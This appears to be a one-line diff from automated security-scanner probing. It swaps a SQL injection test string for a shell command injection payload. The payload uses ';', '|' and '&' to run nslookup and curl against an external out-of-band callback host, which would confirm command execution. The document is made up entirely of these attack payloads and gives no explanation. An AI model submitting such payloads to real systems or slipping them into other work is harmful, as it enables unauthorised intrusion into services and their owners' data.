@@ -1,1 +1,1 @@
--1" OR 2+376-376-1=0+0+0+1 -- 
+;(nslookup -q=cname hitshpnyjzhdu775ad.bxss.me||curl hitshpnyjzhdu775ad.bxss.me)|(nslookup -q=cname hitshpnyjzhdu775ad.bxss.me||curl hitshpnyjzhdu775ad.bxss.me)&(nslookup -q=cname hitshpnyjzhdu775ad.bxss.me||curl hitshpnyjzhdu775ad.bxss.me)
